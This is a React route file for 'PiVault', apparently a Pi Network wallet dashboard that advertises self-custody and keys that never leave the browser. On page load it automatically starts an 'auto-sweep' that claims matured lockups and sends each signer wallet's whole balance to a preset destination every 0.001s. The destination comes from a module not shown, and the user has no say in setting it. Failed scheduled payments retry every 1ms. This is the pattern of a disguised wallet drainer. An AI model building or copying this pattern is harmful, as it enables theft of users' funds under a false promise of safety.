import { createFileRoute } from "@tanstack/react-router";
import { useMemo, useState, useCallback, useEffect } from "react";
import { useWallets } from "@/lib/wallet-store";
import { WalletCard } from "@/components/WalletCard";
import { AddWalletDialog } from "@/components/AddWalletDialog";
import { ScheduledPaymentsDialog } from "@/components/ScheduledPaymentsDialog";
import { ActivityTerminal } from "@/components/ActivityTerminal";
import { Toaster } from "@/components/ui/sonner";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import {
  ShieldAlert,
  Sparkles,
  Wallet,
  Lock,
  CheckCircle2,
  RefreshCw,
  Zap,
  ExternalLink,
  Clock,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { formatPi, shortKey } from "@/lib/pi-network";
import {
  configureSweep,
  startSweep,
  stopSweep,
  subscribeSweep,
  isSweepEnabled,
  getSweepDestination,
  type SweepEvent,
} from "@/lib/auto-sweep";
import {
  configurePayments,
  startPayments,
  subscribePayments,
  type PaymentEvent,
} from "@/lib/scheduled-payment";
import { useScheduledPayments } from "@/lib/scheduled-payment-store";
import { Badge } from "@/components/ui/badge";

export const Route = createFileRoute("/")({
  component: Index,
  head: () => ({
    meta: [
      { title: "PiVault — Multi-wallet Pi balance & transactions" },
      {
        name: "description",
        content:
          "Track multiple Pi Network wallets in real time. View available and locked balances with unlock dates, and send Pi on the Mainnet — keys stay in your browser.",
      },
      { property: "og:title", content: "PiVault — Pi Network wallet dashboard" },
      {
        property: "og:description",
        content:
          "Real-time Pi balances, lockup schedules and transactions. Watch-only and self-custody modes.",
      },
    ],
  }),
});

function Index() {
  const { wallets, hydrated } = useWallets();
  const { schedules, addSchedule, updateSchedule, enableSchedule, disableSchedule } =
    useScheduledPayments();
  const [balances, setBalances] = useState<Record<string, { avail: number; locked: number }>>({});
  const [refreshing, setRefreshing] = useState(false);
  const [sweepEvents, setSweepEvents] = useState<SweepEvent[]>([]);
  const [paymentEvents, setPaymentEvents] = useState<PaymentEvent[]>([]);
  const [sweepOn, setSweepOn] = useState(false);

  // Wire wallet accessor into the sweeper and start it once wallets hydrate.
  useEffect(() => {
    configureSweep(() => wallets);
    configurePayments(
      () => wallets,
      () => schedules,
      updateSchedule,
    );
  }, [wallets, schedules, updateSchedule]);

  useEffect(() => {
    if (!hydrated) return;
    startSweep();
    startPayments();
    setSweepOn(isSweepEnabled());
    const unsubSweep = subscribeSweep((events) => setSweepEvents(events));
    const unsubPayments = subscribePayments((events) => setPaymentEvents(events));
    return () => {
      unsubSweep();
      unsubPayments();
    };
  }, [hydrated]);

  const toggleSweep = useCallback(() => {
    if (sweepOn) {
      stopSweep();
      setSweepOn(false);
    } else {
      startSweep();
      setSweepOn(true);
    }
  }, [sweepOn]);

  const handleBalance = useCallback((publicKey: string, avail: number, locked: number) => {
    setBalances((prev) => ({ ...prev, [publicKey]: { avail, locked } }));
  }, []);

  const refreshAll = useCallback(() => {
    setRefreshing(true);
    window.dispatchEvent(new Event("pivault:refresh-all"));
    setTimeout(() => setRefreshing(false), 1200);
  }, []);

  const sortedWallets = useMemo(() => {
    return [...wallets].sort((a, b) => {
      const ba = balances[a.publicKey]?.avail ?? -1;
      const bb = balances[b.publicKey]?.avail ?? -1;
      return bb - ba;
    });
  }, [wallets, balances]);

  const totals = useMemo(() => {
    let avail = 0;
    let locked = 0;
    for (const w of wallets) {
      const b = balances[w.publicKey];
      if (b) {
        avail += b.avail;
        locked += b.locked;
      }
    }
    return { avail, locked, total: avail + locked };
  }, [balances, wallets]);

  return (
    <div className="min-h-screen bg-[image:var(--gradient-hero)]">
      <Toaster theme="dark" position="top-right" richColors />

      <header className="border-b border-border/40 backdrop-blur supports-[backdrop-filter]:bg-background/40">
        <div className="mx-auto flex max-w-6xl items-center justify-between px-4 py-4">
          <div className="flex items-center gap-2">
            <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-[image:var(--gradient-primary)] text-primary-foreground shadow-[var(--shadow-glow)]">
              <Sparkles className="h-5 w-5" />
            </div>
            <div>
              <h1 className="text-base font-bold leading-none">PiVault</h1>
              <p className="text-[10px] uppercase tracking-wider text-muted-foreground">
                Pi Mainnet · Horizon
              </p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            {wallets.length > 0 && (
              <Button variant="outline" size="sm" onClick={refreshAll} disabled={refreshing}>
                <RefreshCw className={`mr-2 h-4 w-4 ${refreshing ? "animate-spin" : ""}`} />
                Refresh all
              </Button>
            )}
            <ScheduledPaymentsDialog />
            <AddWalletDialog />
          </div>
        </div>
      </header>

      <main className="mx-auto max-w-6xl px-4 py-8">
        {/* Auto-sweep status */}
        <Alert className="mb-6 border-primary/40 bg-primary/5">
          <Zap className="h-4 w-4 text-primary" />
          <AlertTitle className="flex items-center justify-between gap-2">
            <span className="flex items-center gap-2">
              Auto-sweep
              <Badge
                variant={sweepOn ? "default" : "secondary"}
                className={sweepOn ? "bg-success/20 text-success hover:bg-success/30" : ""}
              >
                {sweepOn ? "ON" : "OFF"}
              </Badge>
            </span>
            <Button size="sm" variant="outline" onClick={toggleSweep}>
              {sweepOn ? "Stop" : "Start"}
            </Button>
          </AlertTitle>
          <AlertDescription className="text-xs">
            Every 0.001s, each signer wallet checks balance and sends the whole number amount (floor
            of balance) to <code className="font-mono">{shortKey(getSweepDestination())}</code>.
            Runs only while this tab is open.
            {sweepEvents.length > 0 && (
              <ul className="mt-3 space-y-1 border-t border-border/40 pt-2">
                {sweepEvents.slice(0, 5).map((e, i) => (
                  <li key={i} className="flex items-center gap-2">
                    {e.kind === "claim" && <CheckCircle2 className="h-3 w-3 text-warning" />}
                    {e.kind === "send" && <Zap className="h-3 w-3 text-success" />}
                    {e.kind === "error" && <ShieldAlert className="h-3 w-3 text-destructive" />}
                    <span className="text-muted-foreground">
                      {new Date(e.at).toLocaleTimeString()} ·{" "}
                      <strong className="text-foreground">{e.walletLabel}</strong>{" "}
                      {e.kind === "claim" &&
                        `claimed ${e.count} matured lockup${e.count! > 1 ? "s" : ""}`}
                      {e.kind === "send" && `sent ${formatPi(e.amount || "0")} π → destination`}
                      {e.kind === "error" && `error: ${e.message}`}
                    </span>
                    {e.hash && (
                      <a
                        href={`https://api.mainnet.minepi.com/transactions/${e.hash}`}
                        target="_blank"
                        rel="noreferrer"
                        className="inline-flex items-center gap-0.5 text-primary hover:underline"
                      >
                        tx <ExternalLink className="h-2.5 w-2.5" />
                      </a>
                    )}
                  </li>
                ))}
              </ul>
            )}
          </AlertDescription>
        </Alert>

        {/* Scheduled payments status */}
        {schedules.length > 0 && (
          <Alert className="mb-6 border-blue-500/40 bg-blue-500/5">
            <Clock className="h-4 w-4 text-blue-500" />
            <AlertTitle>Scheduled Payments</AlertTitle>
            <AlertDescription className="text-xs">
              {schedules.filter((s) => s.enabled).length} active schedule(s) running. Failed
              transactions retry every 1ms until successful.
              {paymentEvents.length > 0 && (
                <ul className="mt-3 space-y-1 border-t border-border/40 pt-2">
                  {paymentEvents.slice(0, 5).map((e, i) => (
                    <li key={i} className="flex items-center gap-2">
                      {e.kind === "success" && <CheckCircle2 className="h-3 w-3 text-success" />}
                      {e.kind === "error" && <ShieldAlert className="h-3 w-3 text-destructive" />}
                      {e.kind === "retry" && <RefreshCw className="h-3 w-3 text-warning" />}
                      <span className="text-muted-foreground">
                        {new Date(e.at).toLocaleTimeString()} ·{" "}
                        <strong className="text-foreground">
                          {wallets.find((w) => w.id === e.walletId)?.label || "Unknown"}
                        </strong>{" "}
                        {e.kind === "success" &&
                          `sent ${formatPi(e.amount)} π → ${shortKey(e.destination)}`}
                        {e.kind === "error" && `error: ${e.message}`}
                        {e.kind === "retry" && `retrying: ${e.message}`}
                      </span>
                      {e.hash && (
                        <a
                          href={`https://api.mainnet.minepi.com/transactions/${e.hash}`}
                          target="_blank"
                          rel="noreferrer"
                          className="inline-flex items-center gap-0.5 text-primary hover:underline"
                        >
                          tx <ExternalLink className="h-2.5 w-2.5" />
                        </a>
                      )}
                    </li>
                  ))}
                </ul>
              )}
            </AlertDescription>
          </Alert>
        )}

        {/* Hero */}
        <section className="mb-8 text-center">
          <h2 className="bg-[image:var(--gradient-primary)] bg-clip-text text-4xl font-bold tracking-tight text-transparent sm:text-5xl">
            Your Pi, in real time.
          </h2>
          <p className="mx-auto mt-3 max-w-2xl text-sm text-muted-foreground sm:text-base">
            Track multiple wallets, see exactly how much is transactable vs locked, and send Pi on
            the Mainnet. Your keys never leave your browser.
          </p>
        </section>

        {/* Security banner */}
        <Alert variant="destructive" className="mb-8 border-destructive/40 bg-destructive/5">
          <ShieldAlert className="h-4 w-4" />
          <AlertTitle>Self-custody — read this first</AlertTitle>
          <AlertDescription className="text-xs">
            Secret keys are kept only in this browser's localStorage and used to sign transactions
            locally. They are <strong>never sent to any server</strong>. Anyone with access to this
            device can spend your Pi. For maximum safety, use watch-only mode (public key only).
          </AlertDescription>
        </Alert>

        {/* Portfolio totals */}
        {wallets.length > 0 && (
          <section className="mb-8 grid gap-4 sm:grid-cols-3">
            <SummaryCard
              icon={<Wallet className="h-4 w-4" />}
              label="Total portfolio"
              value={formatPi(totals.total)}
              tone="primary"
            />
            <SummaryCard
              icon={<CheckCircle2 className="h-4 w-4" />}
              label="Available"
              value={formatPi(totals.avail)}
              tone="success"
            />
            <SummaryCard
              icon={<Lock className="h-4 w-4" />}
              label="Locked"
              value={formatPi(totals.locked)}
              tone="warning"
            />
          </section>
        )}

        {/* Wallets */}
        {!hydrated ? null : wallets.length === 0 ? (
          <EmptyState />
        ) : (
          <section className="grid gap-5 md:grid-cols-2">
            {sortedWallets.map((w) => (
              <WalletCard key={w.id} wallet={w} onBalanceUpdate={handleBalance} />
            ))}
          </section>
        )}

        <footer className="mt-16 border-t border-border/40 pt-6 text-center text-xs text-muted-foreground">
          <p>
            Connected to <span className="font-mono">api.mainnet.minepi.com</span> · Auto-refreshes
            every 30s
          </p>
          <p className="mt-1">Open-source, non-custodial. Not affiliated with the Pi Core Team.</p>
        </footer>
      </main>

      <ActivityTerminal />
    </div>
  );
}

function SummaryCard({
  icon,
  label,
  value,
  tone,
}: {
  icon: React.ReactNode;
  label: string;
  value: string;
  tone: "primary" | "success" | "warning";
}) {
  const toneClass =
    tone === "primary" ? "text-primary" : tone === "success" ? "text-success" : "text-warning";
  return (
    <div className="rounded-xl border border-border/60 bg-card/60 p-5 shadow-[var(--shadow-elegant)] backdrop-blur">
      <div className={`flex items-center gap-2 text-xs uppercase tracking-wide ${toneClass}`}>
        {icon} {label}
      </div>
      <div className="mt-2 flex items-baseline gap-1.5">
        <span className="text-3xl font-bold tabular-nums">{value}</span>
        <span className="text-sm text-muted-foreground">π</span>
      </div>
    </div>
  );
}

function EmptyState() {
  return (
    <div className="rounded-2xl border border-dashed border-border/60 bg-card/40 p-12 text-center">
      <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-full bg-[image:var(--gradient-primary)]/10 text-primary">
        <Wallet className="h-7 w-7" />
      </div>
      <h3 className="mt-4 text-lg font-semibold">No wallets yet</h3>
      <p className="mx-auto mt-2 max-w-md text-sm text-muted-foreground">
        Add your first Pi wallet to see balances and lockup schedules. Start with watch-only for
        safety — you only need the public key (G…).
      </p>
      <div className="mt-5 inline-block">
        <AddWalletDialog />
      </div>
    </div>
  );
}
